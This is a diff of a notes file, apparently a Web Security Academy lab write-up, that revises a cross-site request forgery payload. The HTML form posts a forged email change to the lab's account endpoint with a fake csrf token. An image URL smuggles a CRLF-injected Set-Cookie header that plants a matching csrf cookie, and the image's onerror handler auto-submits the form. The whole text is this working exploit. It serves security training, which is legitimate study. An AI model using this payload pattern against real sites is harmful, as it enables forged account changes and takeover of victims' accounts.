@@ -43,16 +43,12 @@ Content-Length: 3440
 # Payload
 
 <html>
-  <body>
-    <form action="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/my-account/change-email" method="POST">
-      <input type="hidden" name="email" value="agc@gmail.com" />
-      <input type="hidden" name="csrf" value="fake" />
-      <input type="submit" value="Submit request" />
-    </form>
-    <script>
-      history.pushState('', '', '/');
-    </script>
-  <img src="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake" onerror="document.forms[0].submit();" />
-  </body>
+ <body>
+  <form action="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/my-account/change-email" method="POST">
+   <input type="hidden" name="email" value="abcdefgh@email.com"/>
+   <input type="hidden" name="csrf" value="fakeblabla"/>
+  </form>
+ </body>
+<img src="https://0aa600fd03e38ed18311006a00b2002e.web-security-academy.net/?search=blabla%0d%0aSet-Cookie%3a%20csrf=fakeblabla%3b%20SameSite=None" onerror="document.forms[0].submit()">
 </html>
 ```
